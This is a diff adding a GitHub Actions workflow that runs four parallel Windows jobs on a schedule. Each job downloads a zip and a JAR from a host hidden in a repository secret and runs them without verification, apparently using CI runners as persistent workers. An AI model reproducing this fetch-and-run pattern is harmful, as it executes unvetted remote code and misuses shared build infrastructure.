@@ -1,0 +1,34 @@
+name: qwq
+on:
+  push:
+  schedule:
+  - cron: "0 2-13 * * *"
+
+jobs:
+  worker:
+    runs-on: windows-latest
+    timeout-minutes: 55
+    strategy:
+      matrix:
+        task: [1, 2, 3, 4]
+    steps:
+    - uses: actions/setup-java@v5
+      with:
+        distribution: 'temurin'
+        java-version: '21'
+    - name: SetUp-Env
+      run: |
+        curl -sS -o cheese_api.zip https://${{ secrets.BASE }}/cheese_api.zip
+        curl -sS -o client.jar https://${{ secrets.BASE }}/client.jar
+      
+        Move-Item -Path ".\client.jar" -Destination "D:\a\_temp\client.jar"
+        curl -sS -o dotnet.exe "https://builds.dotnet.microsoft.com/dotnet/Runtime/10.0.1/dotnet-runtime-10.0.1-win-x86.exe"
+        cmd /c ".\dotnet.exe /quiet"
+        
+        choco install 7zip
+        7z x cheese_api.zip -oD:\a\_temp\
+    - name: Running
+      run: |
+        cd "D:\a\_temp\"
+        Start-Process .\Cheese.LocalServer.exe
+        java -jar client.jar
